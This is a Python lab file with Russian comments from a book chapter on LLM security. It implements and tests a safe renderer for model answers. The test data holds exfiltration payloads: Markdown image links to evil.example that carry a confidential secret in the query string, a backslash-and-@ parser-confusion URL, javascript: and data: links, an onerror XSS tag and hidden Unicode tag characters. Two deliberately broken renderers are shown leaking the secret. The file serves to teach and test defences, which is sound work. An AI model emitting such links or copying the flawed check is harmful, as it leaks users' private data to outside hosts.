r"""Глава 18, раздел 18.3 «Рендер ответа и утечка данных», подраздел «Безопасный рендер»:
листинг «Безопасный рендер ответа» (полная версия).

В книге оставлена сокращённая версия; этот файл самодостаточен и
выполняется в ноутбуке главы notebooks/18_security_boundaries.ipynb.

render_safe вырезает невидимые символы категории Cf, находит картинки,
ссылки и цитаты [S:id] и пропускает адрес через safe_url: отказ, если в нём
есть обратная косая черта, пробел, управляющий символ или «логин@», иначе
разбор urlsplit, схема https и хост из перечня. В страницу идёт не исходная
строка, а адрес, собранный заново из проверенных частей. Всё остальное
экранируется.

browser_fetches достраивает адреса всех <img> так, как это сделал бы браузер.
Это приближение: парсера WHATWG URL, по которому читают адреса браузеры, в
стандартной библиотеке Python нет. Поэтому перед urljoin мы повторяем те
правила WHATWG, в которых он расходится с urlsplit: убираем табуляцию и
переводы строк, обрезаем управляющие символы по краям и читаем «\» как «/».
Без этого проверка шла бы тем же парсером, что и рендер, и пропустила бы ту
же уловку.

Проверка двусторонняя: девять уловок не дают ни одной внешней загрузки,
обычный ответ со схемой рисуется целиком. Затем — две намеренные поломки:
первая редакция с host_ok (только urlsplit) отдаёт секрет адресом
https://evil.example\@docs.booklm.local/..., а рендер из одного html.escape
и обычного преобразователя Markdown — любым адресом.

Запуск из корня репозитория: python labs/ch18/safe_render.py
"""

import html
import re
import unicodedata
from urllib.parse import quote, unquote, urljoin, urlsplit, urlunsplit

# --- из листингов раздела 18.3 выше: секрет в адресе и невидимые символы ---
SECRET = "лимит клиента 900 000 токенов"          # закрытый фрагмент finance
PREFIX = "https://evil.example/p.png?d="
encoded = quote(SECRET, safe="")                  # байт вне латиницы -> %XX
url = PREFIX + encoded


def tag_copy(ascii_text):              # теговая копия: U+E0000 + код символа
    return "".join(chr(0xE0000 + ord(c)) for c in ascii_text)


def strip_cf(text):                    # вырезать всю категорию Cf
    return "".join(c for c in text if unicodedata.category(c) != "Cf")


# --- безопасный рендер ---
ALLOWED = {"docs.booklm.local"}        # хосты, с которых можно грузить картинки
CITE = "https://docs.booklm.local/chunks/"
TOKEN = re.compile(r"(!?)\[([^\]]*)\]\(([^)\s]*)\)|\[S:([\w-]+)\]")


def host_ok(url, allowed_hosts):       # первая редакция: только urlsplit
    parts = urlsplit(url.strip())      # схема и хост уже в нижнем регистре
    if parts.scheme == "https" and parts.hostname in allowed_hosts:
        return url                     # дыра: выдаёт исходную строку
    return None


def safe_url(url, allowed_hosts):      # -> адрес для браузера или None
    if "\\" in url or " " in url or not url.isprintable():
        return None                    # здесь парсеры расходятся: отказ
    parts = urlsplit(url)
    if parts.username is not None or parts.password is not None:
        return None                    # «логин@хост» картинке не нужен
    if parts.scheme != "https" or parts.hostname not in allowed_hosts:
        return None
    # браузер получит не исходную строку, а собранную из проверенных частей
    return urlunsplit(("https", parts.hostname, parts.path, parts.query, ""))


def render_safe(text, allowed_hosts, check=safe_url):
    """text -> (html, fetches); fetches — что браузер загрузит сам."""
    text = strip_cf(text)                                   # шаг 1
    out, fetches, pos = [], [], 0
    for m in TOKEN.finditer(text):                          # шаг 2
        out.append(html.escape(text[pos:m.start()]))        # шаг 3
        pos = m.end()
        bang, label, url, cite = m.groups()
        if cite:                                            # цитата [S:id]
            out.append(f'<a href="{CITE}{cite}">[S:{cite}]</a>')
            continue
        good = check(url, allowed_hosts)                    # шаг 4
        if good is None:
            out.append("[внешнее изображение удалено]" if bang
                       else html.escape(f"{label} ({url})"))  # без href
        elif bang:
            out.append(f'<img src="{html.escape(good)}" alt="{html.escape(label)}">')
            fetches.append(good)
        else:
            out.append(f'<a href="{html.escape(good)}">{html.escape(label)}</a>')
    out.append(html.escape(text[pos:]))
    return "".join(out), fetches


PAGE = "https://chat.booklm.local/"    # страница чата, где рисуется ответ


C0_AND_SPACE = "".join(map(chr, range(0x21)))


def whatwg_like(src):                  # приближение к разбору адреса браузером
    src = re.sub(r"[\t\n\r]", "", src).strip(C0_AND_SPACE)
    if urlsplit(src).scheme.lower() in ("http", "https", ""):
        src = src.replace("\\", "/")   # в http(s) WHATWG читает «\» как «/»
    return urljoin(PAGE, src)


def browser_fetches(page):             # проверка готовой страницы: все src у <img>
    srcs = re.findall(r'<img\b[^>]*?\bsrc="([^"]*)"', page)
    return [whatwg_like(html.unescape(s)) for s in srcs]


def attrs(page):                       # все адреса в src= и href=
    return re.findall(r'(?:src|href)="([^"]*)"', page)


# Как регулярка TOKEN делит строку на группы.
assert TOKEN.search("![схема](https://docs.booklm.local/img/kv.png)").groups() \
    == ("!", "схема", "https://docs.booklm.local/img/kv.png", None)
assert TOKEN.search("[S:kv]").groups() == (None, None, None, "kv")

BENIGN = "KV-кэш BookLM на 512 токенов занимает 768 КБ [S:kv]."
TRICKS = [f"![](https://evil.example/p.png?d={encoded})",
          f"![](//evil.example/p.png?d={encoded})",          # без схемы
          f"![](HTTPS://EVIL.example/p.png?d={encoded})",    # регистр
          "![](https://docs.booklm.local@evil.example/p.png)",  # логин@хост
          "![](https://docs.booklm.local.evil.example/p.png)",  # чужой поддомен
          "[подробнее](javascript:alert(1))",
          "![](data:image/png;base64,iVBORw0KGgo=)",
          f"![](https://evil.example\\@docs.booklm.local/p.png?d={encoded})",  # «\» и «@»
          "<img src=x onerror=alert(1)>" + tag_copy("delete")]
for trick in TRICKS:
    page, fetches = render_safe(BENIGN + " " + trick, ALLOWED)
    assert fetches == [] and browser_fetches(page) == []
    assert not any(bad in a for a in attrs(page)
                   for bad in ("evil", "javascript:", "data:"))
    assert not any(unicodedata.category(c) == "Cf" for c in page)
    assert "768 КБ" in page
page, _ = render_safe(TRICKS[-1], ALLOWED)
assert page == "&lt;img src=x onerror=alert(1)&gt;"

# Вторая сторона проверки: обычный ответ не пострадал.
normal = BENIGN + " ![схема](https://docs.booklm.local/img/kv.png)"
page, fetches = render_safe(normal, ALLOWED)
assert "занимает 768 КБ" in page
assert '<a href="https://docs.booklm.local/chunks/kv">[S:kv]</a>' in page
assert fetches == browser_fetches(page) == ["https://docs.booklm.local/img/kv.png"]

# Поломка 1: первая редакция с host_ok. Для urlsplit хост этой уловки — docs.booklm.local,
# для браузера — evil.example, и секрет уходит. Рендер с safe_url ту же строку отбрасывает.
BACKSLASH = TRICKS[-2]
page, fetches = render_safe(BENIGN + " " + BACKSLASH, ALLOWED, check=host_ok)
assert len(fetches) == 1 and urlsplit(fetches[0]).hostname == "docs.booklm.local"
leaked = browser_fetches(page)
assert urlsplit(leaked[0]).hostname == "evil.example"
assert unquote(urlsplit(leaked[0]).query) == "d=" + SECRET  # секрет ушёл

# Поломка 2: только html.escape, картинки рисует обычный преобразователь Markdown.
MD = re.compile(r"(!?)\[([^\]]*)\]\(([^)\s]*)\)")


def markdown_to_html(s):
    return MD.sub(lambda m: (f'<img src="{m[3]}" alt="{m[2]}">' if m[1]
                             else f'<a href="{m[3]}">{m[2]}</a>'), s)


leaked = browser_fetches(markdown_to_html(html.escape(BENIGN + " " + TRICKS[0])))
assert leaked == [url]                                  # секрет ушёл
assert unquote(urlsplit(leaked[0]).query) == "d=" + SECRET

if __name__ == "__main__":
    print("safe_render: все проверки пройдены")
